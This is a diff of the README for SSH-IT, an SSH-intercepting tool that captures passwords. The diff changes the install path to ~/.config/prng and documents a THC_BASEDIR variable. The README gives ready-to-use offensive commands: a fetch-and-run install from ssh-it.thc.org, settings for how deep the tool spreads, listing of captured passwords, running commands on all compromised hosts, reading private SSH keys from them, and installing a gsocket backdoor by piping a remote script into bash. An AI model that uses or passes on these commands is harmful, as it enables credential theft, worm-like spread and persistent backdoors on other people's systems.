@@ -16,7 +16,7 @@ bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
 
 To show all captured passwords use:
 ```shell
-~/.prng/thc_cli -r list
+~/.config/prng/thc_cli -r list
 ```
 {:refdef: style="text-align: center;"}
 ![Deploy-Example](list-example.png)
@@ -25,7 +25,7 @@ To show all captured passwords use:
 
 To uninstall use:
 ```shell
-~/.prng/thc_cli -r uninstall
+~/.config/prng/thc_cli -r uninstall
 ```
 
 ### Environment variables:
@@ -34,6 +34,7 @@ Deployment can be controlled with these environment variables
 
 |:---|:---|
 |```THC_DEPTH=```|SSH-IT will spread to this depth and then stop. The default is ```THC_DEPTH=2```.|
+|```THC_BASEDIR=```|Installation directory. Default is ```THC_BASEDIR="${HOME}/.config/prng"```.|
 |```THC_VERBOSE=1```|For testing only: Display a warning to the user when *ssh* is being intercepted (in bold red).|
 |```THC_DEBUG=1```|For testing only: Display debug information|
 |```THC_DEBUG_LOG=thc.log```|For testing only: Output (most) debug informatio to ```thc.log```.|
@@ -61,17 +62,17 @@ Example: thc_cli -r list
 #### Remote Command Execution
 Executing a command on _all_ hosts
 ```shell
-~/.prng/thc_cli -r exec 'id'
+~/.config/prng/thc_cli -r exec 'id'
 ```
 
 Retrieve the private SSH key (```id_rsa```) from _all_ hosts:
 ```shell
-~/.prng/thc_cli -r exec 'cat .ssh/id_rsa 2>/dev/null'
+~/.config/prng/thc_cli -r exec 'cat .ssh/id_rsa 2>/dev/null'
 ```
 
 Install a [backdoor](https://www.gsocket.io/deploy) on _all_ hosts:
 ```shell
-~/.prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
+~/.config/prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
 ```
 
 #### When HTTPS is not available
